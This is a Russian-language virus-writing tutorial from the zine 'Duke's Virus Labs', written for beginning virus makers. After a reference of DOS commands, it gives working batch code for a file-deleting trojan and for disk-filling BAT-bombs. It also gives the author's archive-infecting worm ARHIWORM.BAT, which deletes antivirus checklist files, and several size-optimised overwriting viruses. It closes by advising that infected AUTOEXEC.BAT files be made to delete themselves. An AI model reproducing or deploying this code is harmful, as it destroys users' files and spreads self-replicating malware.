Magazine "Duke's Virus Labs"          Number 01          File 006
 ▄▄▄▄▄▄  ▄▄▄▄▄    ▄       ▄  ▄▄▄                  ▄▄▄▄▄   ▄▄▄▄▄▄
          █  ▀█▄  █       █   █          █  █       █
 ▀▀▀▀▀▀   █    █  ▀█     █▀   █        ▀▀█▀▀█▀▀     █     ▀▀▀▀▀▀
 ▄▄▄▄▄▄   █    █   ██   ██    █        ▄▄█▄▄█▄▄     █     ▄▄▄▄▄▄
          █  ▄█▀    █▄ ▄█     █    ▄█    █  █       █
 ▀▀▀▀▀▀  ▀▀▀▀▀       ▀▀▀     ▀▀▀▀▀▀▀              ▀▀▀▀▀   ▀▀▀▀▀▀

                        BAT-virii tutorial
        О написании BAT-вирусов для начинающих virmaker'ов
                           release 01
                        (c) by Duke/SMF


                          Содержание:

Part I

1. О данной статье - предисловие автора
2. Краткий справочник команд DOS, полезных при написании  BAT-ви-
   русов
   2.1 Вступление
   2.2 Перенаправление ввода/вывода DOS
   2.3 Внутренние команды DOS
   2.4 Команды пакетных файлов
   2.5 Внешние команды DOS
3. Различные типы вредоносных файлов, использующих DOS-команды
   3.1 Троянские кони
   3.2 BAT-бомбы
4. Вирусы-черви
5. Overwriting-вирусы
   5.1 Написание простейшего overwriting-вируса и оптимизация его
       кода
   5.2 Использование утилит BAT2EXE и BAT2COM
6. Очевидные наблюдения и рекомендации

Part II

7. Companion-вирусы
   7.1 Теория и принцип действия companion-вирусов
   7.2 Пример вируса
8. Parasitic-вирусы
   8.1 Использование команды "type" для размножения
   8.2 Использование команды "find" для размножения
   8.3 Использование программы DEBUG
   8.4 Использование собственных конвертеров
   8.5 Бинарный способ запуска
   8.6 Использование архиваторов
и многое другое ...
.................................................................


                     1. О данной статье.
                     Предисловие автора.

   Данное пособие предназначено в первую очередь  для  начинающих
virmaker'ов и, боюсь, что профессионалы не  найдут  здесь  ничего
нового. Пособие не претендует на полноту изложения материала. Эта
статья НЕ является переводом или дайджестом, это авторская попыт-
ка объединить свои знания о BAT-вирусах и изложить их в виде  не-
коего подобия учебника/справочника.
   Читатель должен знать расшифровку научного термина "компьютер-
ный вирус" и  с чем его едят, поскольку здесь он этого не найдет.
   Повествование стараюсь вести от более простого к более сложно-
му. Не обижайтесь, если сочтете, что мои объяснения слишком  при-
митивны и предназначены для детей или слабоумных: я хотел,  чтобы
было понятно ВСЕМ (даже детям и слабоумным :). Если же мои объяс-
нения сложны, то это другая проблема - даже когда что-то для  те-
бя очевидно, то вовсе не значит, что  ты  сможешь  объяснить  это
другому :(
   Все примеры вирусов, если это не оговорено отдельно,  написаны
лично мной.
   Если вы найдете в тексте неточности и ошибки или захотите  до-
полнить статью имеющейся у вас информацией, прошу  обращаться  по
адресу, указанному с журнале (файл dvl-01.001).

.................................................................

  2.  К Р А Т К И Й   С П Р А В О Ч Н И К   К О М А Н Д   D O S ,

   П О Л Е З Н Ы Х   П Р И   Н А П И С А Н И И   В И Р У С О В

                      2.1 Вступление

   Я написал эту статью для людей, уже  имеющих  представление  о
командах DOS. Однако, если бы человек хорошо знал эти  самые  ко-
манды, то он смог бы написать BAT-вирус самостоятельно. Так же  я
думаю, что вирмейкеры профессионалы  вряд  ли  будут  читать  эту
статью (как я уже говорил, в ней нет ничего  нового).  Поэтому  я
все же решил включить в статью раздел, посвященный краткому  опи-
санию наиболее используемых в BAT-вирусах  DOS-команд.  Некоторые
параметры и возможности, которые я не посчитал особо  важными,  я
не указываю в моем справочнике. Более полное описание  DOS-команд
можно найти в любой книге по DOS'у. Если вы считаете, что  хорошо
знаете команды DOS, то при чтении статьи эту главу можно  пропус-
тить.
   Все указанные команды работают как в DOS, так и в WINDOWS.

               2.2 Перенаправление ввода/вывода DOS

       < имя_файла  - направить вход из файла (вместо клавиатуры)
       > имя_файла  - направить выход в файл (вместо дисплея)
   При использовании символа ">" выходной файл  перезаписывается.
Для присоединения последующих выходных данных к имеющемуся  файлу
используют знак ">>" вместо ">" :
       >> имя_файла
   Вместо имени файла может быть указано имя логического  устрой-
ства: NUL, CON, и т.д.
   Направление выхода из команды_1 на вход команды_2 (т.е.  пере-
дача сообщений, выводимых командой_1, в качестве  входных  данных
для второй команды):
       команда_1 | команда_2

                2.3 Внутренние команды DOS

   Все внутренние команды "подшиты" в файл COMMAND.COM.  В  квад-
ратных скобках [] указываются параметры, которые могут отсутство-
вать в команде, а в "уголках" <> указываются необходимые парамет-
ры. Шаблонами являются символы "?" (обозначает  любой  символ)  и
"*" (обозначает последовательность из 1-8 символов).

***** BREAK
Использование : BREAK [параметр]
Назначение    : Переключение  режима  контроля за нажатием клавиш
                Ctrl+C и  Ctrl+  Break.  "BREAK  OFF"  -  нажатие
                Ctrl+C  или  Ctrl+Break  будет   контролироваться
                только в процессе выполнения операций ввода/выво-
                да с символьнами устройствами (экраном, клавиату-
                рой, последовательным портом и принтером). "BREAK
                ON" - нажатие клавиш Ctrl+C или  Ctrl+Break  кон-
                тролируется во время любой операции (в том  числе
                дисковых операций ввода/вывода).  Команда  приго-
                дится при написании BAT-бомб.
***** CLS
Использование : CLS
Назначение    : Устанавливает черный цвет фона и серый  цвет сим-
                волов, очищает экран и помещает  курсор  в  левый
                верхний угол экрана.
***** COPY
Использование : COPY [ключ] [путь]<имя источника 1> [ключ]
                [+[путь]<имя файла источника 2> [+[...]] ]
                [[путь]<имя адресата> [ключ]]
Назначение    : Копирует или объединяет файлы (два или более).
                Можно использовать шаблоны. Символ "+" указывает,
                что  нужно соединить несколько файлов в одном ре-
                зультирующем файле. Если файл-адресат не  указан,
                то команда будет присоединять каждый  последующий
                файл источник к первому файлу-источнику. Ключи  :
                /A - при копировании  источника  как  ASCII-файла
                копируются все символы до первого  символа  ^Z  в
                файле. При записи адресата как ASCII-файла в  ко-
                нец добавляется ^Z. По умолчанию файлы  присоеди-
                няются как ASCII. /B - при копировании файла  как
                двоичного файл копируется целиком. При записи ад-
                ресата как двоичного символ ^Z не добавляется. По
                умолчанию файлы всегда копируются  как  двоичные.
                Параметры /A и /B относятся к предыдущему и  всем
                последующим именам файлов в командной строке, ес-
                ли не заданы другие /A или /B.  Команда,  вызван-
                ная из  BAT-файла,  автоматически  перезаписывает
                файл-адресат, если он уже существует.
***** CTTY
Использование : CTTY устройство
Назначение    : Изменяет текущее устройство консоли.
                Консоль (клавиатуру и дисплей) можно заменить  на
                другое устройство, которое выполняет  стандартный
                ввод/вывод символов.  Возможные  устройства:  PRN
                (принтер), LPT1-LPT3  (параллельные  порты),  CON
                (консоль), AUX, COM1-COM4 (последовательные  пор-
                ты), NUL (пустое устройство).
***** DEL
Использование : DEL [диск:][путь]<имя файла> [/P]
Назначение    : Удаляет файл(ы) с диска.
                Можно использовать  шаблоны  для  удаления  групп
                файлов. Ключ "/P" велит  команде  запросить  под-
                тверждение (Y/N) удаления каждого файла.  Команда
                не удаляет скрытые файлы, системные файлы и  фай-
                лы только для чтения (для их  удаления  предвари-
                тельно используется команда ATTRIB).
***** REN
Использование : REN [диск:][путь]<объект_1> <объект_2>
Назначение    : Переименовывает файлы или каталоги.
                Объектами могут быть файлы или каталоги.  Указать
                другой диск или путь для  объекта_2  (результата)
                нельзя. Для перенесения файла на другой диск  на-
                до использовать команду MOVE.
***** SET
Использование : SET [переменная=[значение]]
Назначение    : Отображает, создает, редактирует или  удаляет пе-
                ременные окружения среды DOS. В команде "перемен-
                ная" - имя переменной среды, а "значение" -  зна-
                чение переменной среды.  "Переменная"  не  должна
                содержать в своем имени знаков равенства и пробе-
                лов, большие и малые  латинские  буквы  считаются
                одинаковыми.В зависимости от  указанных  парамет-
                ров команда выполняет различные операции: "SET" -
                отображает окружение "SET переменная"  -  отобра-
                жает содержимое
                                            переменной
                "SET переменная="         - удаляет переменную
                                            из среды
                "SET переменная=значение" - помещает или замещает
                                            значение
                Стандартные переменные :
                PATH    - список каталогов, в которых производит-
                          ся поиск файлов при вызове их на выпол-
                          нение;
                COMSPEC - ядро операционной системы (как  правило
                          "c:\command.com").
***** TYPE
Использование : TYPE [диск:][путь]<имя файла>
Назначение    : Отображает содержимое указанного файла(ов).
                Текстовые - до  первого символа ^Z в файле.

                   2.4 Команды пакетных файлов

   Эти команды могут использоваться только в пакетных (BAT-) фай-
лах. Запись "x|y" в параметре команды означает, что на этом  мес-
те может стоять либо "x", либо "y".
***** CALL
Использование : CALL имя_файла [параметры]
Назначение    : Позволяет вызвать из одного пакетного файла  дру-
                гой  пакетный  файл.  Вызывающий  пакетный   файл
                приостанавливается на время исполнения вызываемо-
                го пакетного  файла.  Когда  вызываемый  пакетный
                файл завершится, вызывающий пакетный файл  возоб-
                новляет свою работу со  следующей  команды.  Если
                вызвать пакетный файл из другого пакетного  файла
                без команды CALL, исполнение вызывающего пакетно-
                го файла  будет  прервано.  Указанные  в  команде
                "CALL" параметры передаются вызываемому  пакетно-
                му файлу в качестве параметров командной строки.
***** ECHO
Использование : ECHO [ON | OFF | сообщение]
Назначение    : Работа с "эхом" ("эхо" - дублирование команд на
                экран).
                "ECHO"           - отображает состояние  "эха";
                "ECHO ON"        - включает "эхо";
                "ECHO OFF"       - выключает "эхо";
                "ECHO сообщение" - отображает сообщение;
                "ECHO."          - выводит пустую строку.
                Символ "@" перед любой командой означает отключе-
                ние "эха" только для этой команды (локальное  от-
                ключение).
***** FOR
Использование : FOR %%переменная IN (ряд) [DO] команда
                FOR %переменная IN (ряд) [DO] команда
Назначение    : Повторяет команду для нескольких членов ряда.
                Переменная последовательно подставляется  в  ках-
                дый член ряда и затем исполняет команду для  каж-
                дого аргумента из ряда. Если в одном из  аргумен-
                тов в ряду содержатся символы шаблона MS-DOS, пе-
                ременная последовательно подставляется  в  каждое
                совпадающее имя файла на диске.  Для  обозначения
                переменной,  подставляемой  из  командной  строки
                (т.е. параметра командной  строки),  используется
                "%"; для переменной из пакетного  файла  -  "%%".
                Имя переменной должно состоять из одиночного сим-
                вола.
***** GOTO
Использование : GOTO [метка]
Назначение    : Оператор перехода для пакетных файлов.
                Продолжает обработку пакетного файла  со  строки,
                следующей за меткой. Перед меткой в пакетном фай-
                ле должен стоять символ ":". Если метка в  коман-
                де GOTO не указана, то процесс  работы  пакетного
                файла завершается (для версий MS-DOS 6.22 и млад-
                ше).
***** IF
Использование : IF [NOT] условие команда
Назначение    : Разрешает выполнение команд после проверки  усло-
                вия. Если условие истинно, выполняется  указанная
                команда; в противном случае она игнорируется. При
                использовании  параметра  "NOT"  команда   выпол-
                няется, когда условие ложно. Варианты использова-
                ния команды "IF": IF [NOT] ERRORLEVEL  n  команда
                IF [NOT] строка1=строка2 команда IF  [NOT]  EXIST
                имя_файла команда ; ;
***** REM
Использование : REM [комментарий]
Назначение    : Помещает комментарий в пакетный файл.
                Если ECHO находится в состоянии  "ON",  коммента-
                рий появится на экране. В комментарии не  следует
                употреблять символов перенаправления ввода/вывода
                DOS.

                      2.5 Внешние команды DOS

***** ATTRIB
Использование : ATTRIB [опции] [[диск:]имя_файла]
Назначение    : Изменяет или отображает атрибуты файла или  ката-
                лога. Возможные опции:
                +A  - установить атрибут "архивный"
                -A  - отменить атрибут "архивный"
                +H  - установить атрибут "скрытый"
                -H  - отменить атрибут "скрытый"
                +R  - установить атрибут "только для чтения"
                -R  - снять атрибут "только для чтения"
                +S  - установить атрибут "системный"
                -S  - снять атрибут "системный"
***** DEBUG
Использование : DEBUG [[диск:][путь]имя_файла [параметры]]
Назначение    : Средство для отладки программ, просмотра содержи-
                мого двоичных файлов, оперативний памяти  и  т.д.
                "Имя_файла" - отлаживаемый  файл,  "параметры"  -
                любые  параметры  командной  строки  отлаживаемой
                программы. Ввод символа "?" после  запуска  DEBUG
                выведет список команд отладки.
***** DELTREE
Использование : DELTREE [/Y] [диск:]путь [[диск:]путь [...]]
Назначение    : Удаляет указанный каталог и все его подкаталоги с
                содержащимися в них  файлами.  Удаляет  один  или
                несколько файлов и каталогов. В  одной  командной
                строке можно задать  несколько  каталогов.  Пара-
                метр "/Y" подавляет запрос на подтверждение [Y/N]
                удаления каталогов.
***** FIND
Использование : FIND [/V] [/I] "строка"
                [диск:][путь]имя_файла
Назначение    : Ищет в файлах заданную  последовательность симво-
                лов.
                /V - выдавать на экран все строки, которые не со-
                     держат указанной строки;
                /I - игнорировать различия регистров.
***** FORMAT
Использование : FORMAT диск: [параметры]
Назначение    : Форматирует (инициализирует) диск.
                Некоторые из параметров:
                /Q - быстрое форматирование -  удаляется  таблица
                     размещения файлов и корневой каталог  с  уже
                     размеченного диска, но не проверяет диск  на
                     наличие дефектных секторов;
                /U - безусловное форматирование - все данные раз-
                     рушаются и не могут быть  восстановлены  ко-
                     мандой UNFORMAT.
***** MOVE
Использование : MOVE [диск:][путь]имя_файла
                [диск:][путь][имя_файла]
Назначение    : Перемещает файлы в другой каталог или  на  другой
                диск, переименовывает каталоги.
                Указанный файл перемещается по указанному  адресу
                файла, указанного последним. Если адрусат уже су-
                ществует, он удаляется.  Нельзя  перемещать  файл
                сам в себя. Если задано более одного файла-источ-
                ника, то адресат должен быть каталогом,  и  файлы
                перемещаются в каталог под собственными  именами;
                если адресат не является  каталогом,  то  команда
                сообщит об ошибке и закончит работу.  При  вызове
                из пакетного файла команда  не  предупреждает  об
                опасности перезаписывания одноименного файла.

Советую также обратить внимание на команды DOSKEY и MODE.
.................................................................

     3.  Р А З Л И Ч Н Ы Е   Т И П Ы   В Р Е Д О Н О С Н Ы Х

 Ф А Й Л О В ,  И С П О Л Ь З У Ю Щ И Х   D O S - К О М А Н Д Ы

                   3.1 Троянские кони

   Троянский конь - это программа, которая маскируется под полез-
ную программу (например, утилиту), а на самом деле совершает  ка-
кие-либо вредоносные действия.
   Многочисленные троянские кони используют вызовы DOS-команд для
своей  деятельности.  Некоторые  из  троянцев  написаны  в   виде
BAT-файла, а затем конвертированы в COM- или EXE-файл.
   Троянец не размножается, а лишь совершает деструкцию,  поэтому
при его написании не возникает проблем (гораздо сложнее  замаски-
ровать его, но это тема для отдельного разговора).
   Как правило троянец пытается уничтожить системные файлы,  фай-
лы в текущем каталоге (диске) или отформатировать диск.
   Пример очень опасного троянца:

   @ctty nul                                                |
   del *.???                                                |
   del c:\*.???                                             | (1)
   del c:\dos\*.???                                         |
   del c:\windows\*.???                                     |

и так далее... Пока вывод на экран отключен,  троянец  планомерно
уничтожает файлы.

                      3.2 BAT-бомбы

   Компьютерная бомба вообще - некий  файл,  мешающий  нормальной
работе компьютера. Этот файл не обязательно имеет исполняемый код
(пример тому - архивные и почтовые бомбы). Бомба стремится  заве-
сить компьютер, занять все свободное дисковое пространство, унис-
тожить файлы.
   Одной из разновидностей бомб  являются  BAT-бомбы.  Простейший
пример такой бомбы - программа, загоняющая компьютер в  бесконеч-
ный цикл:

     @if exist %0 @call %0                                  | (2)

   Другая простейшая бомба будет пытаться  занять  все  свободное
место на диске. Выход по CTRL-Break работать не будет - эта  воз-
можность отключена командой "break off".

     @break off                                             |
     @type %0>>%0                                           | (3)
     @call %0                                               |

Где-то после 8000 самовызовов программа может  остановиться  (сам
не проверял). Самое главное в бомбах такого типа - записать  себя
в саму себя (например, командой "type %0>>%0"). От этого 1)  уве-
личивается длина файла и 2) меньше вызовов потребуется для запол-
нения всего места на диске - длина файла растет, как снежная  ла-
вина.
   Бомбу (3) можно модифицировать и упростить:

     @break off                                             | (4)
     @type %0>>%0                                           |

И все ! Достаточно одного запуска - вторая строка  увеличит  раз-
мер файла вдвое, вместо конца файла  командный  процессор  найдет
новую команду ("@breack off"), затем еще одну и т.  д.  Благодаря
нашей модификации сократился размер бомбы и  повысилась  ее  ско-
рость действия. Но уменьшился ее размер, т.е. для занимания  все-
го дискового пространства ей придется больше поработать. Это мож-
но исправить, добавив строки вида "@rem <набор символов>".
   Приведу примеры двух BAT-бомб,  полученных  от  Ilya  Vasilyev
(2:5020/287). "Они пpедназначены ТОЛЬКО для изyчения и коллекцио-
ниpования. Запускать рекомендуется pазве что камикадзе." - цитата
автора.

=== Begin Babylon.Bat ===
         @echo off                                          |
         rem Babylon BAT Bomb (C) AtH//HPG,8Nov97           |
         set ME=%0                                          |
         if not exist %0 set ME=%0.bat                      |(5а)
         type %ME%>>%ME%                                    |
         if not %1v==-vv goto silent                        |
         dir %ME%|find "BAT"                                |
         :silent                                            |
=== End   Babylon.Bat ===

=== Begin Digger.Bat  ===
         @echo off                                          |
         rem Digger BAT Bomb (C) AtH//HPG,8Nov97            |
         set ME=%0                                          |
         if not exist %0 set ME=%0.bat                      |
         set DIR=%1                                         |
         if %1v==-vv set DIR=%2                             |
         if %DIR%.==. set DIR=TEMP                          |
         md %DIR%                                           |(5б)
         attrib +r +s +h %DIR%                              |
         cd %DIR%                                           |
         copy..\%ME%>nul                                    |
         attrib +r +s +h ..\%ME%                            |
         if %1v==-vv cd                                     |
         %0 %1 %2                                           |
=== End  Digger.Bat   ===

.................................................................

                  4.  В И Р У С Ы  -  Ч Е Р В И

   Главной отличительной особенностью вирусов-червей  от  простых
файловых вирусов является то, что для их размножения (распростра-
нения) не требуются файлы-жертвы, т.е.  червь  может  распростра-
няться на пустом месте. Достигается это путем копирования файла в
над- и подкаталоги (возможно, даже под своим именем) или  копиро-
ванием файла в текущий же каталог, но под другим именем.
   Для архивных червей файлы-жертвы все таки требуются, но  не  в
привычном для нас смысле. Им требуется файл-архив, который они  и
будут "заражать". "Заражением" является запись файла,  содержаще-
го вирус, в найденный архив.
   К каждому типу архивов (точнее, архиваторов) нужен  свой  под-
ход. Необходимо учитывать параметры командной строки, нужные  для
помещения файла в существующий  архив.  При  этом  желательно  не
производить лишнего "шума", т.е. учитывать следующие пункты:
   a] Архиваторы выдают на экран сообщения о процессе архивации -
нельзя допустить их вывода на экран.
   b] Архиваторы позволяют помещать комментарии к архиву  и,  при
их наличии, выводят на экран при каждом обращении к архиву - ком-
ментариям на экране тоже не место.
   Рассмотрим самые распространенные архивы - ARJ, RAR, ZIP.  Бу-
дем добавлять в архивы файл FILE.TXT. Чтобы раз и навсегда  изба-
виться от пункта "a]" будем использовать перенаправление ">nul".
***** ARJ - архиватор ARJ.EXE
   Добавление проводится  легко  и  просто  -  "arj  a  arhiv.arj
file.txt>nul", где параметр "a" указывает на добавление  (от  ан-
глийского "Add") файла к архиву arhiv.arj. Пункт "b]" уже  перек-
рыт - об этом уже позаботился ">nul" (об этом было чуть выше).
***** ZIP - архиватор PKZIP.EXE
   Для того, чтобы добавить файл к  архиву  ARHIV.ZIP  можно  ис-
пользовать команду "pkzip -a arhiv.zip  file.txt>nul",  где  ключ
"-a" обозначает добавление файла к архиву, а  лучше  использовать
команду "pkzip arhiv.zip file.txt>nul"
- она короче ;) От пункта "b]" помогает все тот же ">nul" .
***** RAR - архиватор RAR.EXE
   Ну, с ним самая большая заморочка.  Такого  наворочить  только
Рошал мог... ;))  Нам понадобятся следующие параметры запуска:
       a     - добавить файл к архиву
       -tk   - не изменять время создания архива
       -y    - ответить "Да" на все вопросы
       -c-   - не выводить комментарии на экран
       -o+   - перезаписывать файлы
   Поскольку поставить метку о том, что данный архив уже заражен,
довольно проблематично, то приходится перезаписывать файлы в  ар-
хиве при повторном заражении (ключ -o+).
   Ключ "-c-" необходим потому, что перенаправление ">nul" не по-
может нам спрятать RAR-комментарий, если он есть. Дело в том, что
у других архиваторов черно-белые комментарии, а у RAR`а  -  цвет-
ные. Вывод цветного изображения на консоль осуществляется  иначе,
чем вывод черно-белого. Поэтому  этот  ключик  и  предусмотрен  в
программе.
   Ключи "-tk" и "-y" я привел для излишней предосторожности,  на
всякий случай.
   В итоге наша команда будет выглядеть следующим образом:
"rar a -tk -y -c- -o+ arhiv.rar file.txt> nul"

   В качестве примера приведу свой вирус-червь BAT.ArhiWorm  (так
же о нем рассказывается в файле dvl-01.011), который наглядно де-
монстрирует описанное выше.

@echo off                                                   |
if "%1=="#r goto rar                                        |
if "%1=="#z goto zip                                        |
if "%1=="#a goto arj                                        |
ctty nul                                                    |
copy %0 c:\dos\%0                                           |
copy %0 c:\windows\%0                                       |
copy %0 c:\win95\%0                                         |
copy %0 c:\%0                                               |
copy %0 ..\%0                                               |
del chklist.*                                               |
ctty con                                                    |
for %%r in (*.rar) do call %0 #r %%r                        |
for %%z in (*.zip) do call %0 #z %%z                        |
for %%a in (*.arj) do call %0 #a %%a                        |
goto end                                                    |
:rar                                                        | (6)
attrib -r %2                                                |
rar a -tk -y -c- -o+ %2 %0 >nul                             |
goto end                                                    |
:zip                                                        |
attrib -r %2                                                |
pkzip %2 %0 >nul                                            |
goto end                                                    |
:arj                                                        |
attrib -r %2                                                |
arj a %2 %0 >nul                                            |
:end                                                        |
rem ARHIWORM.BAT v2.1 -file's worm (c) by Duke/SMF 9.06.98  |
echo on                                                     |

Если вирус запущен без особых параметров, то сперва идет  копиро-
вание  в    наиболее    распространенные    каталоги    "C:\DOS",
"C:\WINDOWS", "C:\WIN95","C:\"(он есть всегда) и в надкаталог (он
есть почти всегда). Из-за удаления файлов chklist.*  вирус  будет
считаться опасным. Затем ищутся архивы ARJ, RAR,  ZIP  в  текущем
каталоге и вызывается вирус, но с особыми параметрами. В  зависи-
мости от этих параметров будет  запускаться  нужный  архиватор  с
нужнами параметрами. И все!
.................................................................

              5.  O V E R W R I T I N G  -  В И Р У С Ы

            5.1  Написание простейшего overwriting-вируса
                       и оптимизация его кода

   Начинать всегда надо с самого простого и примитивного.  А  что
может быть проще, чем overwriting (перезаписывающий) вирус ?  При
его создании не надо заботиться о работоспособности файла-жертвы,
о получении вирусом управления и о передаче его телу жертвы.
   Напишем вирус, который будет поражать все  BAT-файлы  текущего
каталога без вывода на экран каких-либо  сопутствующих  сообщений
(маскировка - превыше всего !) :

         @echo off                                          |
         for %%b in (*.bat) do copy %0 %%b>nul              | (7)
         echo on                                            |

   Первая строка отключает  эхо  (повторение)  команд,  последняя
включает эхо. Средняя строка перебирает  все  BAT-файлы  текущего
каталога и для каждого найденного осуществляет команду  "copy  %0
%%b" - копирует работающий BAT-файл в найденный  файл,  уничтожая
первоначальное содержимое  жертвы.  ">nul"  перенаправляет  вывод
сообщений на пустое устройство (NUL) вместо экрана (CON).
   В принципе, строку "echo on" можно опустить, но это может пов-
лечь за собой некорректный вывод на экран после запуска следующе-
го файла.
   Поскольку символ "@" перед командой означает локальное  отклю-
чение эха (т.е. отключение  при  выполнении  только  этой  коман-
ды),то программу (7) можно переписать в виде:

         @for %%b in (*.bat) do @copy %0 %%b>nul            | (8)

   Команда "type" выводит на экран текстовый файл  (т.е.  выводит
содержимое файла, пока не встретится символ  13h).  BAT-файл  яв-
ляется простым текстовым файлом (в главе X будут рассмотрены  ис-
ключения из этого правила), поэтому  команду  "copy  %0  %%b>nul"
можно заменить на равноценную "type %0>%%b" :

         @for %%b in (*.bat) do @type %0>%%b                | (9)

   При переходе от (7) к (9) мы сократили длину нашего  вируса  с
57 байт до 35 байт (оптимизация - 33% ! ). Однако в дальнейшем не
следует забывать, что стремясь к  малому  количеству  не  следует
пренебрегать качеством !

   Так обстоит дело в теории. А как на практике? Будут  ли  рабо-
тать вирусы (7) и (8) ? Оказывается, что будут,  но  в  них  есть
ошибочка. Рано или поздно команда "for %%b in (*.bat)"  дойдет  в
своем  переборе  до  работающего  файла-вируса  (ведь    у    нас
BAT-вирус). Вот тут то и прячется ошибка. Если в  команде  "copy"
задано копирование файла в тот же каталог и  под  тем  же  именем
(что у нас и получится), по копирование не производится. DOS  вы-
даст сообщение об ошибке :

         File Cannot be copied onto itself
            0 file(s) copied

("Файл не может быть скопирован в себя. Скопировано  0  файлов").
Но поскольку вывод на экран у нас перекрыт  (">nil"),  то  ничего
страшного не произойдет и заражение пройдет успешно.
   В случае с вирусом (9) дело обстоит иначе. Когда перебор  дой-
дет до работающего файла-вируса, команда "type" сперва  перезапи-
шет его (длина файла станет равна 0), затем считает его  и  запи-
шет считанное в него. В результате получим файл-вирус длины  0  и
все пораженные после этого файлы будут также иметь длину  0.  Как
же избежать этого? Самый простой способ - проверка имен файлов  :
если имя источника и имя  адресата  совпадают,  то  заражение  не
производить.

   @for %%b in (*.bat) do @if not -%0==-%%b @type %0>%%b    |(10)

Таким образом, самый короткий реально работающий вирус из создан-
ных нами имеет вид (8).
   В вирусе (10) следует обратить внимание  на  способ сравнения.
При сравнении строк, содержащих символы параметров %0 - %9,  сле-
дует проявлять осторожность. Например, сравнение второго парамет-
ра командного файла со строкой "DDD" не следует делать  так:  "if
%2==DDD...". Дело в том, что если в командном файле  меньше  двух
параметров, то символы %2 будут замещены пустой  строкой,  и  при
выполнении команды  возникнет  ошибка.  В  случае  сравнения  "if
DDD=%2..." при отсутствии второго  параметра  возможно  выпонение
совсем не той команды. Правильным сравнением в любом  случае  бу-
дет "if -%2==-DDD...", где вместо символа "-" можно поставить лю-
бой символ.


            5.2 Использование утилит BAT2EXE и BAT2COM

   С помощью утилит BAT2EXE или BAT2COM можно перевести файл  (7)
в EXE- или COM-файл. Если заменить в файле (7) строку "*.bat"  на
"*.exe" (соответственно "*.com"), то с помощью этих утилит мы по-
лучим полноценный EXE- (COM-) overwriting-вирус. Недостатком этих
утилит является большой размер  получаемого  файла  (он  содержит
сведения об авторе утилит, пустующие DUMMY-блоки и другой мусор),
поэтому если вы желаете написать очень короткий вирус,  вам  надо
осваивать язык Assembler : самый короткий из известных мне  виру-
сов Trivial.18 написан на Assembler'е и имеет длину 18  байт,  он
копирует себя в первый параметр командной строки. Если вы  думае-
те, что вирус (9) - самый короткий вирус на BAT-языке, то вы оши-
баетесь ! Среди BAT-вирусов есть два аналога  вируса  Trivial.18,
имеющие длину 10 (!!!) байт :

         copy %0 %1                                         |(11)

и

         type %0>%1                                         |(12)


.................................................................

             6. Очевидные наблюдения и рекомендации

   Перед тем, как приступить к дальнейшему изложению материала, я
хочу поделиться некоторыми ценными размышлениями, которые  приго-
дятся в дальнейшем.

                             *  *  *
Не используйте команду
      del *.*
В этом случае перед выполнением команды MS-DOS спросит:
      All files in directory will be deleted!
      Are you sure (Y/N) ?
и будет ждать ответа не вопрос. Чтобы избежать  этого  нужно  ис-
пользовать один из нижеприведенных вариантов:
      1)  del *.???
      2)  echo Y|del *.*
      3)  echo Y>z
          del *.*<z

                             *  *  *

Иногда при копировании BAT-файлов как текстовых вместо команды
      copy 1.txt 2.txt>nul
лучше использовать команду
      type 1.txt>2.txt
(выигрыш в длине = 4 байта !).

                            *  *  *

Файл AUTOEXEC.BAT - единственный BAT-файл, возвращающий  в  нуле-
вом параметре командной строки (т.е. в параметре равном имени ра-
ботающего файла) пустую строку (это имеет место при загрузке сис-
темы, а больше, кстати, этот файл ни на что  не  годен).  Поэтому
совутую обращать особое внимание на заражение этого файла (напри-
мер, как это делает вирус Blah). Мое предложение - раз уж  вирус,
поразивший AUTOEXEC.BAT, размножаться  нормально  не  сможет,  то
ничто не мешает ему уйти из жизни с шиком. Например, устройте ма-
ленькую деструкцию, вставив в начале вируса строку
    if -%0==- del c:\autoexec.bat

                  [ продолжение следует ... ]

-------------------------<end of file>---------------------------
